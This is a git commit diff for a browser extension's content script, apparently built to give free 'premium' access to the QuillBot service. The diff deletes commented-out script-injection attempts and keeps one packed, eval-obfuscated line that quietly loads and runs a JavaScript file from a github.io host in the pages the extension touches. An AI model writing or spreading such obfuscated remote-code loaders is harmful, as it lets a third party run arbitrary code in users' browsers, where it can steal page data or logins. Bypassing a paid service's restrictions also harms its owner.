2f671a584a5d4fddeb97066e6fb54f36f373fb4b
Ragu <88898517+Raguggg@users.noreply.github.com>
2022-12-10 20:59:36 +0530

    Update content.js

--- extension/content.js
+++ extension/content.js
@@ -1,11 +1,1 @@
-// const script = document.createElement('script');
-// script.setAttribute('type', 'text/javascript');
-// script.setAttribute('src', 'C:\\Users\\91759\\Downloads\\ryui\\quillbot_free-main\\quillbot.js');
-// script.setAttribute('src', 'https://raguggg.github.io/quillbot_free/quillbot.js');
-// document.head.appendChild('<script src="https://raguggg.github.io/quillbot_free/quillbot.js"></script>');
-// var yourscript = document.createElement('script');
-// yourscript.type = 'text/javascript';
-// yourscript.async = true;
-// yourscript.src = 'https://ragug.github.io/quillbot-premium-free/quillbot.js';
-// document.head.appendChild(yourscript);
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 1=2.5("6");1.7="8/9",1.a=!0,1.b="c://d.e.f/3-g-h/3.i",2.j.k(1);',21,21,'|t|document|quillbot|var|createElement|script|type|text|javascript|async|src|https|ragug|github|io|premium|free|js|head|appendChild'.split('|'),0,{}))
